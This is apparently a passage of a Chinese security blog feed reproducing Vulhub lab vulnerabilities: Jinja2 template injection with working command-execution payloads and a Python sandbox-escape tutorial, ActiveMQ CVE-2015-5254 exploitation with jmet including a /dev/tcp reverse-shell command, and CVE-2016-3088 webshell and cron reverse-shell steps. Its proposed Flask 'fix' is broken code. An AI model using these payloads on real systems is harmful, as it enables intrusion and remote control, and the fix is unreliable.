<pre><code class="language-python">from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route(&quot;/&quot;)
def index():
    name = request.args.get('name', 'guest')

    t = Template(&quot;Hello &quot; + name)
    return t.render()

if __name__ == &quot;__main__&quot;:
    app.run()
    
    
// 很简单发现了name变量是我们能够控制的。
</code></pre>
<h6 id="漏洞成因分析">漏洞成因分析</h6>
<p>首先输入正常值</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/1.png" alt="" loading="lazy"></figure>
<p>然后输入嵌套jinja2语法的语句</p>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/2.png" alt="" loading="lazy"></figure>
<p>很容易就发现了这一处漏洞</p>
<h6 id="代码修复">代码修复</h6>
<pre><code class="language-python">from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route(&quot;/&quot;)
def index():
    name = request.args.get('name', 'guest')

    t = Template(&quot;Hello &quot; + {{temp}})
    return t.render(temp=&quot;name&quot;)

if __name__ == &quot;__main__&quot;:
    app.run()
    
//这样就能避免这个漏洞
</code></pre>
<h6 id="漏洞利用">漏洞利用</h6>
<p>vulhub的POC</p>
<pre><code class="language-jinja2">{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__(&quot;os&quot;).popen(&quot;id&quot;).read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
</code></pre>
<p>得到一下结果</p>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/3.png" alt="" loading="lazy"></figure>
<h6 id="python沙盒逃逸">python沙盒逃逸</h6>
<p>vulhub的POC里面用的是一些python的魔术方法，因为在jinja2里面我们是可以访问python的一些对象和方法。</p>
<p>Python的一些魔术方法</p>
<pre><code class="language-python"># 1 __class__ : 返回当前对象所属的类
&gt;&gt;&gt; ().__class__
&lt;class 'tuple'&gt;
&gt;&gt;&gt; [].__class__
&lt;class 'list'&gt;

#2 __base__&amp;&amp;__bases__ :作用都是返回当前类所继承的类，即基类，区别是base返回单个，bases以元组形式返回所有基类。
&gt;&gt;&gt; class A():
...     pass
&gt;&gt;&gt; class B():
...     pass
&gt;&gt;&gt; class C(A,B):
...     pass
&gt;&gt;&gt; C.__base__
&lt;class '__main__.A'&gt;
&gt;&gt;&gt; C.__bases__
(&lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;)

#3 __mro__ :以元组的方式返回继承关系
&gt;&gt;&gt; C.__mro__
(&lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;, &lt;class 'object'&gt;)


#4 __subclasses__():以列表的形式返回类的子类
&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()
[&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, &lt;class 'weakproxy'&gt;, &lt;class 'int'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes'&gt;, &lt;class 'list'&gt;, &lt;class 'NoneType'&gt;, &lt;class 'NotImplementedType'&gt;, &lt;class 'traceback'&gt;, &lt;class 'super'&gt;, &lt;class 'range'&gt;, &lt;class 'dict'&gt;, &lt;class 'dict_keys'&gt;, &lt;class 'dict_values'&gt;, &lt;class 'dict_items'&gt;, &lt;class 'odict_iterator'&gt;, &lt;class 'set'&gt;, &lt;class 'str'&gt;, &lt;class 'slice'&gt;, &lt;class 'staticmethod'&gt;, &lt;class 'complex'&gt;, &lt;class 'float'&gt;, &lt;class 'frozenset'&gt;, &lt;class 'property'&gt;, &lt;class 'managedbuffer'&gt;, &lt;class 'memoryview'&gt;, &lt;class 'tuple'&gt;, &lt;class 'enumerate'&gt;, &lt;class 'reversed'&gt;, &lt;class 'stderrprinter'&gt;, &lt;class 'code'&gt;, &lt;class 'frame'&gt;, &lt;class 'builtin_function_or_method'&gt;, &lt;class 'method'&gt;, &lt;class 'function'&gt;, &lt;class 'mappingproxy'&gt;, &lt;class 'generator'&gt;, &lt;class 'getset_descriptor'&gt;, &lt;class 'wrapper_descriptor'&gt;, &lt;class 'method-wrapper'&gt;, &lt;class 'ellipsis'&gt;, &lt;class 'member_descriptor'&gt;, &lt;class 'types.SimpleNamespace'&gt;, &lt;class 'PyCapsule'&gt;, &lt;class 'longrange_iterator'&gt;, &lt;class 'cell'&gt;, &lt;class 'instancemethod'&gt;, &lt;class 'classmethod_descriptor'&gt;, &lt;class 'method_descriptor'&gt;, &lt;class 'callable_iterator'&gt;, &lt;class 'iterator'&gt;, &lt;class 'coroutine'&gt;, &lt;class 'coroutine_wrapper'&gt;, &lt;class 'EncodingMap'&gt;, &lt;class 'fieldnameiterator'&gt;, &lt;class 'formatteriterator'&gt;, &lt;class 'filter'&gt;, &lt;class 'map'&gt;, &lt;class 'zip'&gt;, &lt;class 'moduledef'&gt;, &lt;class 'module'&gt;, &lt;class 'BaseException'&gt;, &lt;class '_frozen_importlib._ModuleLock'&gt;, &lt;class '_frozen_importlib._DummyModuleLock'&gt;, &lt;class '_frozen_importlib._ModuleLockManager'&gt;, &lt;class '_frozen_importlib._installed_safely'&gt;, &lt;class '_frozen_importlib.ModuleSpec'&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class 'classmethod'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib._ImportLockContext'&gt;, &lt;class '_thread._localdummy'&gt;, &lt;class '_thread._local'&gt;, &lt;class '_thread.lock'&gt;, &lt;class '_thread.RLock'&gt;, &lt;class '_frozen_importlib_external.WindowsRegistryFinder'&gt;, &lt;class '_frozen_importlib_external._LoaderBasics'&gt;, &lt;class '_frozen_importlib_external.FileLoader'&gt;, &lt;class '_frozen_importlib_external._NamespacePath'&gt;, &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;, &lt;class '_frozen_importlib_external.FileFinder'&gt;, &lt;class '_io._IOBase'&gt;, &lt;class '_io._BytesIOBuffer'&gt;, &lt;class '_io.IncrementalNewlineDecoder'&gt;, &lt;class 'nt.ScandirIterator'&gt;, &lt;class 'nt.DirEntry'&gt;, &lt;class 'PyHKEY'&gt;, &lt;class 'zipimport.zipimporter'&gt;, &lt;class 'codecs.Codec'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class 'codecs.StreamReaderWriter'&gt;, &lt;class 'codecs.StreamRecoder'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class 'abc.ABC'&gt;, &lt;class 'collections.abc.Hashable'&gt;, &lt;class 'collections.abc.Awaitable'&gt;, &lt;class 'collections.abc.AsyncIterable'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'collections.abc.Iterable'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'dict_keyiterator'&gt;, &lt;class 'dict_valueiterator'&gt;, &lt;class 'dict_itemiterator'&gt;, &lt;class 'list_iterator'&gt;, &lt;class 'list_reverseiterator'&gt;, &lt;class 'range_iterator'&gt;, &lt;class 'set_iterator'&gt;, &lt;class 'str_iterator'&gt;, &lt;class 'tuple_iterator'&gt;, &lt;class 'collections.abc.Sized'&gt;, &lt;class 'collections.abc.Container'&gt;, &lt;class 'collections.abc.Callable'&gt;, &lt;class 'os._wrap_close'&gt;, &lt;class '_sitebuiltins.Quitter'&gt;, &lt;class '_sitebuiltins._Printer'&gt;, &lt;class '_sitebuiltins._Helper'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;]

#5 __globals__ :以字典的形式返回函数所在模块命名空间的所有变量。
#所有的函数都会有一个__globals__属性，可以通过globals获得大量内置函数，包括eval，exec等执行命令的1的函数

#6 __builtin__&amp;&amp;__builtins__: python中直接能用的比如int(),list()等函数，可以直接在builtins里面查询到。（python3）
&gt;&gt;&gt; import builtins
&gt;&gt;&gt; dir(builtins)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']

#python2：dir(__builtins__)
'''
__builtin__ 和 __builtins__之间是什么关系呢？
1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。
2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身
'''



#利用python特殊方法bypass沙盒


## 构造继承链的思想

#1.任意使用一个内置对象用class拿到他所对应的类
#2.用bases拿到基类（&lt;class 'object'&gt;）
#3.用subclasses()拿到子类列表
#4.在字类里面寻找可以利用的类

&gt;&gt;&gt; t = ().__class__.__bases__[0].__subclasses__()
&gt;&gt;&gt; for c in t:
...     if c.__name__== 'file':
...             print t.index(c)
... 
40
#寻找file对象


&gt;&gt;&gt; dir(().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines)
['__call__', '__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__self__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
#使用dir查看对象内置方法：



</code></pre>
<p>同样的方法使用eval方法来获取目录文件</p>
<pre><code class="language-jinja2">{% for c in ().__class__.__bases__[0].__subclasses__(): %}
{% if c.__name__ == '_IterationGuard': %}
{{c.__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('ls').read()&quot;) }}
{% endif %}
{% endfor %}
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/4.png" alt="" loading="lazy"></figure>
<p>参考链接：<a href="https://www.freebuf.com/articles/web/98619.html">https://www.freebuf.com/articles/web/98619.html</a></p>
<p>​		<a href="https://www.cnblogs.com/hackxf/p/10480071.html">https://www.cnblogs.com/hackxf/p/10480071.html</a></p>
<p>​		<a href="https://eustiar.com/archives/157">https://eustiar.com/archives/157</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2015-5254]]></title>
        <id>https://www.yyxyy.xyz/post/cve-2015-5254/</id>
        <link href="https://www.yyxyy.xyz/post/cve-2015-5254/">
        </link>
        <updated>2021-06-09T07:58:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="activemq-反序列化漏洞cve-2015-5254复现">ActiveMQ 反序列化漏洞（CVE-2015-5254）复现</h2>
<h4 id="漏洞简介">漏洞简介</h4>
<p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。</p>
<h4 id="漏洞复现">漏洞复现</h4>
<ol>
<li>
<p>漏洞利用过程</p>
<ol>
<li>构造可执行命令的序列化对象</li>
<li>作为一个消息发送给目标61616端口</li>
<li>访问的Web管理页面，读取消息，触发漏洞</li>
</ol>
</li>
<li>
<p>使用jmet进行漏洞利用</p>
<pre><code class="language-shell"> wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
 mkdir external
</code></pre>
</li>
<li>
<p>执行命令</p>
<ol>
<li>
<pre><code class="language-shell">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/sucess&quot; -Yp ROME   127.0.0.1   61616
</code></pre>
</li>
</ol>
</li>
</ol>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254/1.png" alt="" loading="lazy"></figure>
<ol start="4">
<li>此时目标站ActiveMQ会收到名为事件的队列，在admin/queues.jsp下面（账号admin密码admin）</li>
</ol>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254/2.png" alt="" loading="lazy"></figure>
<ol start="5">
<li>
<p>点击这个消息便出发了漏洞</p>
</li>
<li>
<p>此时进入容器，发现存在tmp目录已经创建说明漏洞利用成功</p>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254//3.png" alt="" loading="lazy"></figure>
</li>
</ol>
<p>最后反弹shell</p>
<p>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bin -i &gt;&amp; /dev/tcp/127.0.0.1/7777 0&gt;&amp;1&quot; -Yp ROME 192.168.180.133 61616</p>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254//4.png" alt="" loading="lazy"></figure>
<p>点击消息</p>
<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254//5.png" alt="" loading="lazy"></figure>
<p>反弹shell成功</p>
<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254//6.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2016-3088]]></title>
        <id>https://www.yyxyy.xyz/post/cve-2016-3088/</id>
        <link href="https://www.yyxyy.xyz/post/cve-2016-3088/">
        </link>
        <updated>2021-06-09T07:57:28.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cve-2016-3088漏洞复现">CVE-2016-3088漏洞复现</h1>
<h2 id="背景描述">背景描述</h2>
<p>ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java 的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用。</p>
<h2 id="原理分析">原理分析</h2>
<p>ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录，且路径在conf/jetty.xml中定义，定义如下：</p>
<pre><code class="language-xml">&lt;bean class =“ org.eclipse.jetty.webapp.WebAppContext”&gt;
    &lt;property name =“ contextPath” value =“ / fileserver” /&gt;
    &lt;property name =“ resourceBase” value =“ $ {activemq.home} / webapps / fileserver” /&gt;
    &lt;property name =“ logUrlOnStart” value =“ true” /&gt;
    &lt;property name =“ parentLoaderPriority” value =“ true” /&gt;
&lt;/ bean&gt;
</code></pre>
<pre><code>fileserver:储存文件的接口，可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，
其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但是随后发现：
1.其使用率并不高
2.文件操作容易出现漏洞
所以ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。
</code></pre>
<h2 id="漏洞利用">漏洞利用</h2>
<p>首先写入一个文件，随后使用移动文件的请求将文件移动到任意位置，<br>
造成任意文件写入漏洞。文件写入有如下方法可以利用：</p>
<ol>
<li>写入webshell</li>
<li>写入cron或ssh key等文件</li>
<li>写入jar或jetty.xml等库和配置文件</li>
</ol>
<h2 id="漏洞复现">漏洞复现</h2>
<p>1.上传webshell，但是不会解析</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/1.png" alt="" loading="lazy"></figure>
<p>2.移动到api目录下面（api下面会解析）</p>
<p>首先看一下api路径（(http://ip:8161/admin/test/systemProperties.jsp)）</p>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/2.png" alt="" loading="lazy"></figure>
<p>移动到api目录下。</p>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/3.png" alt="" loading="lazy"></figure>
<p>查看api目录</p>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/4.png" alt="" loading="lazy"></figure>
<p>3.执行命令</p>
<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/5.png" alt="" loading="lazy"></figure>
<p>利用完毕。</p>
<p>4.利用cron添加定时任务反弹shell</p>
<p>添加shell脚本</p>
<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/6.png" alt="" loading="lazy"></figure>
<p>移动shell脚本到/etc/cron.d下面</p>
<figure data-type="image" tabindex="7"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/7.png" alt="" loading="lazy"></figure>
<p>反弹shell</p>
<figure data-type="image" tabindex="8"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/8.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/9.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[docker命令学习]]></title>
        <id>https://www.yyxyy.xyz/post/docker-ming-ling-xue-xi/</id>
        <link href="https://www.yyxyy.xyz/post/docker-ming-ling-xue-xi/">
        </link>
        <updated>2021-06-06T03:58:04.000Z</updated>
        <content type="html"><![CDATA[<h4 id="docker">docker</h4>
<h6 id="开启docker">开启docker</h6>
<pre><code class="language-shell">systemctl start docker
</code></pre>
<h6 id="关闭docker">关闭docker</h6>
<pre><code class="language-shell">service docker stop  或者  systemctl stop docker
</code></pre>
<h6 id="容器列表">容器列表</h6>
<pre><code class="language-shell">docker ps

docker ps -a
</code></pre>
<h6 id="开启容器">开启容器</h6>
<pre><code class="language-shell">docker start 容器名称  
比如开启名字为cli容器： docker start cli
</code></pre>
<h6 id="vulhub靶场">vulhub靶场</h6>
<pre><code class="language-shell">docker-compose up -d         //docker生成靶场
 
docker-compose down        //要进入另一个漏洞靶场，则先要结束掉当前漏洞靶场
</code></pre>
]]></content>
    </entry>
</feed>